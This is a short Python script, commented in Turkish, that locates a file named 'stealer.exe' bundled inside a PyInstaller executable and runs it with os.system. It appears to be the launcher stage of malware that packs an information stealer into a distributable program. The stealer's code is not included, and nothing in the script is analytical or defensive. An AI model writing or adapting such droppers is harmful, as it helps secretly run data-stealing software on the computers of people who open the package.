import sys
import os

# PyInstaller ile gömülü exe dosyasının yolunu bulma
def get_resource_path(relative_path):
    """Gömülü dosyanın bulunduğu yolu döndürür."""
    try:
        # PyInstaller ile çalışırken
        base_path = sys._MEIPASS
    except Exception:
        # Normal çalışma sırasında
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

exe_path = get_resource_path('stealer.exe')

# EXE dosyasını çalıştır
os.system(f'"{exe_path}"')
